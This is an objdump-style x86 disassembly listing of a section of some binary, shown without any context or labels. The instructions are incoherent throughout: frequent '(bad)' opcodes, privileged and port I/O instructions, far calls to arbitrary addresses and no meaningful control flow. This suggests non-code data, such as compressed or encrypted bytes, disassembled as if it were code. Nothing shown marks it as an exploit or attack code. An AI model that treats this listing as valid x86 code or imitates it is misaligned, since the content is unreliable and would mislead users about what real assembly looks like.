  419cae:	and    ch,BYTE PTR [edi-0x3fdb2749]
  419cb4:	jb     0x419cae
  419cb6:	jecxz  0x419c9a
  419cb8:	iret   
  419cb9:	add    ch,dl
  419cbb:	adc    al,0x68
  419cbd:	cwde   
  419cbe:	out    dx,al
  419cbf:	inc    ebp
  419cc0:	stc    
  419cc1:	imul   esi,DWORD PTR [esi-0x5],0xffffff9f
  419cc5:	not    BYTE PTR [edx-0x4a]
  419cc8:	jne    0x419d22
  419cca:	xor    al,0xcd
  419ccc:	push   0x79b50946
  419cd1:	dec    esi
  419cd2:	adc    eax,0xd29ae66d
  419cd7:	inc    edx
  419cd8:	sbb    BYTE PTR [edi-0x4],cl
  419cdb:	cmp    BYTE PTR [ebp-0x29],cl
  419cde:	in     eax,0xb8
  419ce0:	sbb    dl,BYTE PTR [ebx+edi*2-0x6e764fe7]
  419ce7:	inc    ebp
  419ce8:	adc    bh,BYTE PTR [eax]
  419cea:	inc    edx
  419ceb:	gs getsec 
  419cee:	std    
  419cef:	test   al,0x75
  419cf1:	adc    BYTE PTR [esi+0x32],0x9d
  419cf5:	mov    DWORD PTR [ebx-0x4d],edi
  419cf8:	sub    DWORD PTR [ebx],esi
  419cfa:	jns    0x419d32
  419cfc:	jae    0x419c98
  419cfe:	jmp    0x419d30
  419d00:	dec    edi
  419d01:	or     al,BYTE PTR [edx]
  419d03:	loop   0x419d28
  419d05:	pop    ecx
  419d06:	mov    bl,0x65
  419d08:	sahf   
  419d09:	ja     0x419cb2
  419d0b:	cmp    BYTE PTR [edi+0x6a26a87e],dl
  419d11:	clc    
  419d12:	sub    eax,0x790ccc6c
  419d17:	mov    al,0xf5
  419d19:	sbb    DWORD PTR [esi-0x73],eax
  419d1c:	xchg   esp,eax
  419d1d:	dec    edx
  419d1e:	and    ah,0x1a
  419d21:	mul    BYTE PTR [ebx]
  419d23:	inc    esp
  419d24:	jb     0x419cbf
  419d26:	sbb    bh,dl
  419d28:	fsub   st(1),st
  419d2a:	and    DWORD PTR [edx-0x13],edx
  419d2d:	xor    al,0x49
  419d2f:	cwde   
  419d30:	ss ja  0x419cfc
  419d33:	aad    0xd6
  419d35:	mov    bh,0x8f
  419d37:	scas   al,BYTE PTR es:[edi]
  419d38:	jbe    0x419cdd
  419d3a:	mov    eax,ds:0xe8624ef3
  419d3f:	jmp    0x886026a5
  419d44:	inc    ebx
  419d45:	pusha  
  419d46:	clc    
  419d47:	dec    eax
  419d48:	add    BYTE PTR [ecx-0x7a],dl
  419d4b:	sub    al,0xe3
  419d4d:	mov    ebx,esi
  419d4f:	xchg   esp,eax
  419d50:	inc    ecx
  419d51:	xor    al,0xea
  419d53:	repnz fdiv QWORD PTR [eax+0x67ffa1e3]
  419d5a:	into   
  419d5b:	mov    esi,0x5fefe89
  419d60:	adc    ah,BYTE PTR [edi-0x78]
  419d63:	lock clc 
  419d65:	push   cs
  419d66:	aaa    
  419d67:	scas   eax,DWORD PTR es:[edi]
  419d68:	mov    al,ds:0x586e0503
  419d6d:	add    esp,DWORD PTR [edi]
  419d6f:	mov    WORD PTR [ebx+0x3d24a3e],cs
  419d75:	dec    ecx
  419d76:	lods   al,BYTE PTR ds:[esi]
  419d77:	das    
  419d78:	mov    ds:0x852af277,al
  419d7d:	pop    ecx
  419d7e:	sub    DWORD PTR [esi],0xffffffa4
  419d81:	ret    
  419d82:	and    ecx,esp
  419d84:	push   es
  419d85:	pop    edx
  419d86:	xor    BYTE PTR [esi-0x6a],bl
  419d89:	xchg   ebp,eax
  419d8a:	mov    ah,BYTE PTR [edx+ecx*1-0x13ba162c]
  419d91:	push   edx
  419d92:	iret   
  419d93:	adc    DWORD PTR [esi],ebx
  419d95:	dec    esp
  419d96:	inc    esi
  419d97:	pushf  
  419d98:	add    cl,BYTE PTR [eax-0x6e78a81a]
  419d9e:	ret    
  419d9f:	outs   dx,DWORD PTR ds:[esi]
  419da0:	scas   eax,DWORD PTR es:[edi]
  419da1:	add    ebx,0x872b2cc4
  419da7:	push   0x6c4c6be
  419dac:	dec    ebx
  419dad:	mov    edi,0x4bdf2318
  419db2:	pop    esp
  419db3:	pcmpeqb mm4,QWORD PTR [edi-0x4335e3d0]
  419dba:	enter  0xd5bf,0x84
  419dbe:	inc    eax
  419dbf:	aam    0xdb
  419dc1:	jle    0x419df5
  419dc3:	push   ebx
  419dc4:	icebp  
  419dc5:	fld    st(0)
  419dc7:	push   ebx
  419dc8:	neg    DWORD PTR [ecx+eax*4+0x3b4c6fec]
  419dcf:	clc    
  419dd0:	pop    esi
  419dd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419dd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419dd3:	pop    ebx
  419dd4:	xchg   DWORD PTR [edi-0x595f7f2d],edx
  419dda:	shl    DWORD PTR [ebp-0x30837df8],0x69
  419de1:	into   
  419de2:	fldcw  WORD PTR [esi+0x4b]
  419de5:	mov    esp,ebx
  419de7:	cli    
  419de8:	push   0x43d8137c
  419ded:	pop    es
  419dee:	xchg   edi,eax
  419def:	mov    ecx,0xc4509fc5
  419df4:	push   ebp
  419df5:	sub    al,0xcd
  419df7:	jae    0x419e2e
  419df9:	and    eax,0xd65196d6
  419dfe:	mov    dh,0xd4
  419e00:	pop    ecx
  419e01:	das    
  419e02:	int3   
  419e03:	pop    ss
  419e04:	in     al,0x23
  419e06:	pusha  
  419e07:	mov    edi,0x8d82bdc
  419e0c:	sar    DWORD PTR [eax-0x28],1
  419e0f:	inc    esp
  419e10:	add    DWORD PTR [ecx-0xc7f850c],ecx
  419e16:	and    bh,BYTE PTR [eax]
  419e18:	cdq    
  419e19:	dec    edi
  419e1a:	imul   ecx,DWORD PTR [esi],0x59
  419e1d:	nop
  419e1e:	pop    ecx
  419e1f:	xlat   BYTE PTR ds:[ebx]
  419e20:	stc    
  419e21:	outs   dx,BYTE PTR ds:[esi]
  419e22:	inc    ebp
  419e23:	daa    
  419e24:	mov    ds:0x44fde37d,eax
  419e29:	je     0x419e6b
  419e2b:	(bad)  
  419e2d:	dec    esi
  419e2e:	test   eax,0x26ee7399
  419e33:	loop   0x419df1
  419e35:	push   es
  419e36:	mov    edi,DWORD PTR [ecx+0xc]
  419e39:	outs   dx,DWORD PTR ds:[esi]
  419e3a:	or     edi,DWORD PTR ds:0xccf8b7a7
  419e40:	mov    BYTE PTR [ebx+0x41],cl
  419e43:	or     dh,BYTE PTR [esi+eiz*8-0x27b4f8e]
  419e4a:	mov    esi,0xad18e511
  419e4f:	push   0xffffffa9
  419e51:	mov    esp,0xf744983e
  419e56:	add    dh,dl
  419e58:	bnd jae 0x419e4c
  419e5b:	push   ebx
  419e5c:	xchg   esp,eax
  419e5d:	sub    DWORD PTR [edx],esp
  419e5f:	sub    DWORD PTR gs:[eax],edi
  419e62:	hlt    
  419e63:	stc    
  419e64:	data16 aas 
  419e66:	cdq    
  419e67:	repnz sub al,0x76
  419e6a:	xor    esi,DWORD PTR [ecx-0x757fe05f]
  419e70:	fld    st(3)
  419e72:	pop    ds
  419e73:	rol    BYTE PTR [ebp+0x29d1ce25],0xd7
  419e7a:	jg     0x419e7e
  419e7c:	adc    DWORD PTR [ebx],eax
  419e7e:	xchg   ebx,eax
  419e7f:	sahf   
  419e80:	sub    DWORD PTR [eax],esi
  419e82:	js     0x419ea9
  419e84:	jl     0x419e1c
  419e86:	push   ecx
  419e87:	js     0x419e1f
  419e89:	jle    0x419ee7
  419e8b:	in     eax,dx
  419e8c:	aaa    
  419e8d:	or     DWORD PTR [ebx],ecx
  419e8f:	ja     0x419ee5
  419e91:	inc    edi
  419e92:	push   edi
  419e93:	sub    dh,BYTE PTR es:[ebp-0x44]
  419e97:	call   0x5140137
  419e9c:	stos   DWORD PTR es:[edi],eax
  419e9d:	ins    DWORD PTR es:[edi],dx
  419e9e:	outs   dx,DWORD PTR ds:[esi]
  419e9f:	jno    0x419e55
  419ea1:	lock jmp 0x419f10
  419ea4:	add    bl,BYTE PTR [ecx-0x38]
  419ea7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ea8:	or     ch,dl
  419eaa:	mov    edx,0x2af9c33
  419eaf:	pop    ds
  419eb0:	popa   
  419eb1:	push   ebx
  419eb2:	cld    
  419eb3:	xchg   BYTE PTR [eax-0x58],ch
  419eb6:	inc    esi
  419eb7:	inc    ebx
  419eb8:	jns    0x419e47
  419eba:	sbb    eax,0x711c298
  419ebf:	xor    esp,edi
  419ec1:	fidivr DWORD PTR [edx-0x7a69008b]
  419ec7:	jmp    0x419ede
  419ec9:	jl     0x419f08
  419ecb:	push   ebp
  419ecc:	mov    es,WORD PTR [edi+0x589606b8]
  419ed2:	xor    DWORD PTR [eax+0x5f5b3ea8],esi
  419ed8:	dec    ebp
  419ed9:	imul   eax,DWORD PTR [esi],0x5b1c37e5
  419edf:	loopne 0x419f09
  419ee1:	scas   eax,DWORD PTR es:[edi]
  419ee2:	call   0xeb3e:0xcbbebe99
  419ee9:	jge    0x419e83
  419eeb:	rcl    BYTE PTR [esi+0x31],cl
  419eee:	sar    DWORD PTR [edx+0x24a5bf57],cl
  419ef4:	sub    BYTE PTR [ecx],ch
  419ef6:	cwde   
  419ef7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ef8:	xchg   ebp,eax
  419ef9:	cmp    al,0xb7
  419efb:	dec    eax
  419efc:	mov    eax,0x6562066
  419f01:	lahf   
  419f02:	(bad)  
  419f03:	mov    WORD PTR [edi],?
  419f05:	push   eax
  419f06:	mov    esp,0x7b148589
  419f0b:	pop    esi
  419f0c:	mov    esi,0xca97e12f
  419f11:	popf   
  419f12:	adc    dh,BYTE PTR [edi-0x14]
  419f15:	xor    DWORD PTR [eax-0x4be48bed],edx
  419f1b:	rol    BYTE PTR [edi+0x431b2fc3],0x1
  419f22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f23:	(bad)  
  419f24:	lods   eax,DWORD PTR ds:[esi]
  419f25:	inc    ebx
  419f26:	xor    bl,dl
  419f28:	inc    ecx
  419f29:	pushf  
  419f2a:	popa   
  419f2b:	mov    ebx,0x28637c07
  419f30:	or     eax,0x35b43566
  419f35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f36:	cmp    BYTE PTR [edi],dh
  419f38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f39:	sub    DWORD PTR [ebp-0x5142e1f],ebx
  419f3f:	adc    eax,0x7f3e483d
  419f44:	rcr    BYTE PTR [esp+edi*8],cl
  419f47:	call   0x4864:0xb0dd03ab
  419f4e:	jns    0x419f76
  419f50:	dec    eax
  419f51:	mov    esp,0xee3a9990
  419f56:	or     DWORD PTR [eax+0x75],0xffffffb4
  419f5a:	sbb    eax,0x72b72b55
  419f5f:	dec    ecx
  419f60:	jp     0x419f94
  419f62:	sub    al,0xdf
  419f64:	add    DWORD PTR [edi],eax
  419f66:	into   
  419f67:	add    BYTE PTR [eax-0xd],bh
  419f6a:	fld    TBYTE PTR [edi+0x4]
  419f6d:	(bad)  [ebx+eiz*1+0x69e765e3]
  419f74:	dec    ebp
  419f75:	out    0xf5,al
  419f77:	or     eax,0xcc0e20d0
  419f7c:	repnz mov al,0x2e
  419f7f:	lahf   
  419f80:	clc    
  419f81:	jle    0x419f39
  419f83:	out    0x8a,eax
  419f85:	and    al,BYTE PTR [ecx+0x6b58a82f]
  419f8b:	mov    ds:0xb5581a51,eax
  419f90:	mov    edi,0x9fe52b36
  419f95:	or     DWORD PTR [eax],edx
  419f97:	xchg   ebx,eax
  419f98:	call   0xc4bae6aa
  419f9d:	jnp    0x419f75
  419f9f:	ins    BYTE PTR es:[edi],dx
  419fa0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419fa1:	retf   0x7547
  419fa4:	aad    0x23
  419fa6:	lock mov edi,0x10c7783d
  419fac:	test   esp,ecx
  419fae:	jle    0x419f35
  419fb0:	pop    eax
  419fb1:	inc    esp
  419fb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419fb3:	repnz in eax,dx
  419fb5:	out    dx,al
  419fb6:	and    eax,0x682bd577
  419fbb:	pusha  
  419fbc:	push   ss
  419fbd:	jno    0x41a02b
  419fbf:	push   esp
  419fc0:	test   ebp,esi
  419fc2:	hlt    
  419fc3:	adc    bh,BYTE PTR [ebp-0x4ea9210]
  419fc9:	sbb    ecx,DWORD PTR [eax]
  419fcb:	and    DWORD PTR [eax],ebx
  419fcd:	fsubr  DWORD PTR [ecx-0x78]
  419fd0:	outs   dx,BYTE PTR ds:[esi]
  419fd1:	mov    esi,0x1f2e4f73
  419fd6:	and    eax,0x97243850
  419fdb:	rcl    edx,cl
  419fdd:	xchg   ebp,eax
  419fde:	push   esi
  419fdf:	mov    ah,0x74
  419fe1:	adc    DWORD PTR [edx-0x5e748a9],ebx
  419fe7:	pop    esp
  419fe8:	mov    ch,0x71
  419fea:	stc    
  419feb:	outs   dx,BYTE PTR ds:[esi]
  419fec:	popf   
  419fed:	inc    edx
  419fee:	bound  esp,QWORD PTR [edx-0x28]
  419ff1:	ja     0x41a000
  419ff3:	mov    bl,0xa1
  419ff5:	popf   
  419ff6:	dec    eax
  419ff7:	adc    eax,0xfb8b327c
  419ffc:	call   0x6cda:0x29ae3e20
  41a003:	jmp    0x41a018
  41a005:	pop    edx
  41a006:	jno    0x41a02f
  41a008:	cmp    eax,ebx
  41a00a:	sub    DWORD PTR [ebp-0x2],0xffffff86
  41a00e:	and    al,bh
  41a010:	adc    al,0x3a
  41a012:	lahf   
  41a013:	lahf   
  41a014:	and    al,0xc3
  41a016:	fs pop ebp
  41a018:	js     0x419fc6
  41a01a:	dec    esi
  41a01b:	out    dx,al
  41a01c:	xchg   ebp,eax
  41a01d:	push   esp
  41a01e:	imul   BYTE PTR ds:[esi]
  41a021:	iret   
  41a022:	iret   
  41a023:	add    al,0xb6
  41a025:	xchg   ecx,eax
  41a026:	mov    ds:0x902b81ba,eax
  41a02b:	shl    DWORD PTR [ebp-0x12],cl
  41a02e:	pop    eax
  41a02f:	inc    eax
  41a030:	xlat   BYTE PTR ds:[ebx]
  41a031:	add    esi,esi
  41a033:	inc    ebx
  41a034:	adc    DWORD PTR [ecx-0x3],ebx
  41a037:	xor    eax,ecx
  41a039:	cmp    eax,0x3a65d090
  41a03e:	and    edx,ecx
  41a040:	sahf   
  41a041:	mov    dh,0xca
  41a043:	add    BYTE PTR [edx+0x43c152af],al
  41a049:	cmp    esi,DWORD PTR [edx]
  41a04b:	mov    ebp,0xcdbe017e
  41a050:	lds    eax,FWORD PTR [ebp-0x59]
  41a053:	sub    bl,BYTE PTR [ecx]
  41a055:	mov    al,0xb9
  41a057:	xchg   ebx,eax
  41a058:	rcl    BYTE PTR [ebx-0x784a953a],0xcc
  41a05f:	sub    DWORD PTR ds:0xd9c426cf,0x6564af51
  41a069:	out    0xa8,eax
  41a06b:	sbb    BYTE PTR [edi+eax*4],0xfb
  41a06f:	sub    eax,0x486eae32
  41a074:	jmp    0x41a018
  41a076:	pusha  
  41a077:	xchg   ebp,eax
  41a078:	add    eax,0x44f22514
  41a07d:	push   esp
  41a07e:	test   al,0x96
  41a080:	arpl   WORD PTR [edi+eax*4+0x93658f],di
  41a087:	retf   0x75a9
  41a08a:	sti    
  41a08b:	cmp    DWORD PTR [eax],eax
  41a08d:	adc    al,0x34
  41a08f:	jecxz  0x41a084
  41a091:	outs   dx,DWORD PTR ds:[esi]
  41a092:	idiv   bh
  41a094:	mov    edx,0xa15c99ba
  41a099:	sti    
  41a09a:	out    0xf6,al
  41a09c:	stos   BYTE PTR es:[edi],al
  41a09d:	add    ebp,DWORD PTR ds:[edi+0x78]
  41a0a1:	sub    al,0x16
  41a0a3:	cmp    BYTE PTR [ecx+0x9],cl
  41a0a6:	in     eax,dx
  41a0a7:	lea    edx,[ecx]
  41a0a9:	sub    edi,eax
  41a0ab:	mov    ah,BYTE PTR [edx-0x66ce7a78]
  41a0b1:	cmp    eax,0x1df86185
  41a0b6:	xor    BYTE PTR [edi-0x237233f9],bl
  41a0bc:	mov    es,WORD PTR [ecx]
  41a0be:	out    0xf0,al
  41a0c0:	pop    es
  41a0c1:	lods   eax,DWORD PTR ds:[esi]
  41a0c2:	inc    esi
  41a0c3:	clc    
  41a0c4:	aaa    
  41a0c5:	dec    ebp
  41a0c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0c7:	loope  0x41a143
  41a0c9:	xchg   DWORD PTR [edi-0x5afaf71f],ebx
  41a0cf:	adc    bh,BYTE PTR [ebx]
  41a0d1:	ret    
  41a0d2:	(bad)  
  41a0d3:	xchg   esp,eax
  41a0d4:	dec    ecx
  41a0d5:	pop    ds
  41a0d6:	sti    
  41a0d7:	je     0x41a0f4
  41a0d9:	adc    edi,esp
  41a0db:	loope  0x41a0d2
  41a0dd:	pop    esi
  41a0de:	xor    DWORD PTR [eax+0x8],edi
  41a0e1:	popa   
  41a0e2:	jmp    0xf5d9:0x5fc511ec
  41a0e9:	outs   dx,DWORD PTR ds:[esi]
  41a0ea:	ficomp DWORD PTR [eax+0x33ca4fc4]
  41a0f0:	data16 jns 0x41a0e1
  41a0f3:	inc    eax
  41a0f4:	adc    BYTE PTR [ecx-0x389ff356],dl
  41a0fa:	adc    ecx,ebx
  41a0fc:	daa    
  41a0fd:	add    al,0xe8
  41a0ff:	cdq    
  41a100:	scas   al,BYTE PTR es:[edi]
  41a101:	inc    ebp
  41a102:	push   ds
  41a103:	cdq    
  41a104:	xchg   BYTE PTR [eax],bl
  41a106:	test   DWORD PTR [edx],eax
  41a108:	gs or  ebx,ebx
  41a10b:	mov    bl,0x44
  41a10d:	sbb    ch,0x18
  41a110:	dec    ecx
  41a111:	add    ebp,edx
  41a113:	ja     0x41a0ec
  41a115:	jno    0x41a156
  41a117:	out    0xf2,eax
  41a119:	or     DWORD PTR [esi-0x364c28e7],0xfffffff7
  41a120:	iret   
  41a121:	mov    dh,0xc6
  41a123:	mul    DWORD PTR [eax+0x40]
  41a126:	push   es
  41a127:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a128:	sbb    BYTE PTR [eax-0x49],0x2e
  41a12c:	retf   
  41a12d:	or     eax,0xee578235
  41a132:	inc    ecx
  41a133:	(bad)  
  41a134:	jae    0x41a11c
  41a136:	and    ah,BYTE PTR [eax]
  41a138:	dec    esp
  41a139:	dec    edi
  41a13a:	imul   ecx,DWORD PTR [eax],0xffffff9b
  41a13d:	jnp    0x41a0f1
  41a13f:	rol    DWORD PTR [ecx+ebx*4-0x4a3fe886],1
  41a146:	clc    
  41a147:	push   ebx
  41a148:	inc    esi
  41a149:	popf   
  41a14a:	fmul   DWORD PTR [edi]
  41a14c:	(bad)  
  41a14d:	aam    0x7e
  41a14f:	fsubrp st(5),st
  41a151:	int    0xfb
  41a153:	adc    eax,0xa6980a10
  41a158:	xlat   BYTE PTR ds:[ebx]
  41a159:	or     dl,dl
  41a15b:	popf   
  41a15c:	out    dx,eax
  41a15d:	leave  
  41a15e:	fistp  DWORD PTR [ebx+0x3e]
  41a161:	or     eax,0x17580fc4
  41a166:	idiv   esp
  41a168:	push   ss
  41a169:	cmp    al,0xdf
  41a16b:	out    0x95,eax
  41a16d:	add    edi,ebx
  41a16f:	in     eax,0x3c
  41a171:	mov    BYTE PTR [esi+0x67],dh
  41a174:	push   cs
  41a175:	cmp    al,0x96
  41a177:	inc    eax
  41a178:	loop   0x41a1b6
  41a17a:	outs   dx,DWORD PTR ds:[esi]
  41a17b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a17c:	xlat   BYTE PTR ds:[ebx]
  41a17d:	popa   
  41a17e:	or     al,0x6
  41a180:	(bad)  
  41a182:	stos   DWORD PTR es:[edi],eax
  41a183:	pop    esp
  41a184:	mov    edi,0x8c36b873
  41a189:	test   BYTE PTR [eax],dl
  41a18b:	inc    ebx
  41a18c:	fcmovnb st,st(1)
  41a18e:	ds jnp 0x41a1aa
  41a191:	shr    BYTE PTR [eax+0x274166ae],1
  41a197:	cld    
  41a198:	icebp  
  41a199:	loope  0x41a1f0
  41a19b:	ins    DWORD PTR es:[edi],dx
  41a19c:	push   esp
  41a19d:	jp     0x41a1af
  41a19f:	mov    edx,0x1a69930b
  41a1a4:	push   edi
  41a1a5:	dec    edx
  41a1a6:	cli    
  41a1a7:	xchg   DWORD PTR [esi],ecx
  41a1a9:	aad    0xa6
  41a1ab:	mov    dl,0x17
  41a1ad:	jmp    0x41a1aa
  41a1af:	push   0x8cb07267
  41a1b4:	test   eax,0xe8b4225b
  41a1b9:	mov    esp,0xe43a3eda
  41a1be:	repz jne 0x41a19e
  41a1c1:	out    dx,eax
  41a1c2:	(bad)  
  41a1c3:	dec    ebp
  41a1c4:	jecxz  0x41a148
  41a1c6:	pop    eax
  41a1c7:	lods   al,BYTE PTR ds:[esi]
  41a1c8:	jp     0x41a229
  41a1ca:	xchg   edi,eax
  41a1cb:	jge    0x41a1ca
  41a1cd:	or     eax,0x834e052f
  41a1d2:	test   eax,0x57f6019b
  41a1d7:	popa   
  41a1d8:	pop    ss
  41a1d9:	ss nop
  41a1db:	ret    0x55d
  41a1de:	sti    
  41a1df:	loop   0x41a1ee
  41a1e1:	mov    BYTE PTR [ebx+0x1e],al
  41a1e4:	or     BYTE PTR [ebp+0x4c],0x44
  41a1e8:	pop    es
  41a1e9:	es dec edi
  41a1eb:	iret   
  41a1ec:	push   ebp
  41a1ed:	and    bl,BYTE PTR [eax+0x737a0f7b]
  41a1f3:	cmp    BYTE PTR [eax-0x233d065c],0xfb
  41a1fa:	cli    
  41a1fb:	stos   BYTE PTR es:[edi],al
  41a1fc:	fldcw  WORD PTR [eax+0x5a]
  41a1ff:	test   eax,0x521aec6
  41a204:	inc    BYTE PTR [ebp-0x6c]
  41a207:	cli    
  41a208:	stos   BYTE PTR es:[edi],al
  41a209:	push   cs
  41a20a:	and    ecx,DWORD PTR [edi]
  41a20c:	add    BYTE PTR [ebx],0xc2
  41a20f:	neg    BYTE PTR [ebx-0x23]
  41a212:	das    
  41a213:	loop   0x41a1f6
  41a215:	jge    0x41a228
  41a217:	xor    esi,esp
  41a219:	call   0xdf52:0xccd426a7
  41a220:	push   ebp
  41a221:	jno    0x41a1fe
  41a223:	inc    ebp
  41a224:	push   ss
  41a225:	sti    
  41a226:	mov    ebx,0xdc4552e
  41a22b:	sub    al,0xe5
  41a22d:	mov    ch,0xf4
  41a22f:	out    0xd5,eax
  41a231:	popf   
  41a232:	mov    eax,0x5dec6baa
  41a237:	retf   
  41a238:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a239:	adc    dh,BYTE PTR [edi]
  41a23b:	xchg   ebx,eax
  41a23c:	sub    edi,DWORD PTR ss:[esi]
  41a23f:	jl     0x41a232
  41a241:	pop    ecx
  41a242:	aam    0x71
  41a244:	aam    0x1d
  41a246:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a247:	sbb    DWORD PTR [eax-0x6d5645d7],esp
  41a24d:	mov    cl,0xf0
  41a24f:	or     DWORD PTR [ecx-0x77],edx
  41a252:	xchg   ecx,eax
  41a253:	adc    BYTE PTR [ebp+0xa],cl
  41a256:	cmp    eax,0x5aa5c99d
  41a25b:	inc    ebp
  41a25c:	pop    eax
  41a25d:	mov    gs,WORD PTR [esi+0x70065919]
  41a263:	add    ecx,0x81c78312
  41a269:	ret    0xf7c7
  41a26c:	push   ebx
  41a26d:	out    dx,al
  41a26e:	pop    ecx
  41a26f:	outs   dx,BYTE PTR ds:[esi]
  41a270:	jbe    0x41a289
  41a272:	pop    edx
  41a273:	bound  esi,QWORD PTR [esi]
  41a275:	xlat   BYTE PTR ds:[ebx]
  41a276:	or     esp,edx
  41a278:	xchg   ebx,eax
  41a279:	or     BYTE PTR [edi-0x2e375d87],ah
  41a27f:	shl    eax,0x4f
  41a282:	idiv   BYTE PTR [ebp-0x2c]
  41a285:	hlt    
  41a286:	xor    DWORD PTR [edx],esp
  41a288:	fist   WORD PTR [edx+0x222d16ae]
  41a28e:	jmp    0x41a2a9
  41a290:	sub    edx,DWORD PTR [esi-0x62da2611]
  41a296:	sbb    al,BYTE PTR cs:[di-0x25f7]
  41a29c:	aam    0x3
  41a29e:	idiv   DWORD PTR [eax+0x65]
  41a2a1:	add    al,0x54
  41a2a3:	ds mov bl,0xf3
  41a2a6:	sub    eax,0xc08a8f88
  41a2ab:	mov    eax,0xed548474
  41a2b0:	outs   dx,DWORD PTR ds:[esi]
  41a2b1:	jbe    0x41a31a
  41a2b3:	popf   
  41a2b4:	es scas eax,DWORD PTR es:[edi]
  41a2b6:	inc    edx
  41a2b7:	outs   dx,BYTE PTR ds:[esi]
  41a2b8:	pop    edi
  41a2b9:	js     0x41a275
  41a2bb:	push   ds
  41a2bc:	push   es
  41a2bd:	xchg   edi,eax
  41a2be:	(bad)  
  41a2bf:	in     eax,0xdc
  41a2c1:	mov    eax,ds:0x21fd6eb9
  41a2c6:	push   cs
  41a2c7:	(bad)  [ecx-0x1c3c35e1]
  41a2cd:	cmp    al,0xf7
  41a2cf:	add    DWORD PTR [ebx-0xa],edi
  41a2d2:	sbb    al,BYTE PTR [ebx+0x43]
  41a2d5:	pop    ebp
  41a2d6:	fidivr WORD PTR [ecx+0x52]
  41a2d9:	jae    0x41a270
  41a2db:	add    BYTE PTR ds:0xe2865fe7,0x75
  41a2e2:	repnz fst DWORD PTR [esi+0x6ff0cb7c]
  41a2e9:	mov    WORD PTR [edx],?
  41a2eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2ec:	imul   ebx,DWORD PTR ds:0xc85412b0
  41a2f3:	jecxz  0x41a2cf
  41a2f5:	imul   esi,DWORD PTR [ecx+0x48666044],0x73
  41a2fc:	lds    ecx,FWORD PTR [ecx+0x12]
  41a2ff:	loopne 0x41a293
  41a301:	xor    DWORD PTR [ecx],ecx
  41a303:	xor    al,0x22
  41a305:	js     0x41a35e
  41a307:	sub    dl,BYTE PTR [ebp-0x29]
  41a30a:	and    al,0x2a
  41a30c:	retf   
  41a30d:	aam    0xe0
  41a30f:	mov    ah,0x59
  41a311:	int3   
  41a312:	adc    bh,dl
  41a314:	and    eax,0x626e07da
  41a319:	xor    ebp,edi
  41a31b:	scas   al,BYTE PTR es:[edi]
  41a31c:	jne    0x41a2dd
  41a31e:	idiv   DWORD PTR [esi+0x19]
  41a321:	mov    WORD PTR [edi+0x4],ss
  41a324:	or     eax,0x7503aa0f
  41a329:	xchg   esp,eax
  41a32a:	(bad)  
  41a32b:	pop    edx
  41a32c:	in     al,0xcf
  41a32e:	pop    edx
  41a32f:	fmul   DWORD PTR [edx]
  41a331:	clc    
  41a332:	hlt    
  41a333:	inc    edi
  41a334:	mov    eax,0x39eebe24
  41a339:	int3   
  41a33a:	mov    ebx,0x33c3977a
  41a33f:	inc    edi
  41a340:	leave  
  41a341:	pop    ecx
  41a342:	push   esp
  41a343:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a344:	cmp    bl,bh
  41a346:	jae    0x41a30a
  41a348:	push   ds
  41a349:	jmp    0xa6b48b57
  41a34e:	mov    bl,0x21
  41a350:	test   al,0xf2
  41a352:	mov    ch,0xb0
  41a354:	sahf   
  41a355:	fst    st(4)
  41a357:	push   edx
  41a358:	adc    BYTE PTR [edx],al
  41a35a:	mov    ebp,0xf591c7d
  41a35f:	jmp    0x41a355
  41a361:	(bad)  
  41a363:	dec    ebx
  41a364:	int    0x7e
  41a366:	cmp    eax,0x3dec1166
  41a36b:	fsubr  DWORD PTR ds:0x2ae1264b
  41a371:	lods   eax,DWORD PTR ds:[esi]
  41a372:	jmp    0x41a339
  41a374:	mov    dl,0xd7
  41a376:	cmp    esi,DWORD PTR [ecx]
  41a378:	jle    0x41a376
  41a37a:	mov    ds:0x56a42897,al
  41a37f:	scas   eax,DWORD PTR es:[edi]
  41a380:	sbb    edi,esi
  41a382:	inc    esi
  41a383:	sti    
  41a384:	and    DWORD PTR [ecx-0x35],eax
  41a387:	sbb    BYTE PTR es:[edi+ebp*1+0x27e14481],bh
  41a38f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a390:	and    eax,0x62dfe602
  41a395:	pop    esp
  41a396:	addr16 jg 0x41a38b
  41a399:	cdq    
  41a39a:	aam    0x79
  41a39c:	stos   BYTE PTR es:[edi],al
  41a39d:	jbe    0x41a3a1
  41a39f:	cmp    edx,esi
  41a3a1:	out    dx,eax
  41a3a2:	add    eax,0xc8f8bb76
  41a3a7:	dec    ebx
  41a3a8:	jmp    0x41a38d
  41a3aa:	sbb    BYTE PTR [ebp+ebp*8+0x2d6d2a6a],al
  41a3b1:	cmp    ecx,DWORD PTR [eax]
  41a3b3:	popa   
  41a3b4:	stos   BYTE PTR es:[edi],al
  41a3b5:	xchg   ecx,eax
  41a3b6:	mov    al,0x66
  41a3b8:	fcomp  DWORD PTR [edx]
  41a3ba:	fwait
  41a3bb:	pop    es
  41a3bc:	inc    ecx
  41a3bd:	stos   DWORD PTR es:[edi],eax
  41a3be:	rcl    DWORD PTR [edi-0x7a4c6662],cl
  41a3c4:	bound  edi,QWORD PTR gs:[edx-0x3c0a3c11]
  41a3cb:	(bad)  
  41a3cc:	mov    ds:0xe7391e79,eax
  41a3d1:	idiv   BYTE PTR [edx]
  41a3d3:	xor    DWORD PTR [ecx+0x63],0xffffffd1
  41a3d7:	pop    esp
  41a3d8:	lods   eax,DWORD PTR ds:[esi]
  41a3d9:	arpl   WORD PTR [ebp-0x3f],di
  41a3dc:	lods   al,BYTE PTR ds:[esi]
  41a3dd:	aaa    
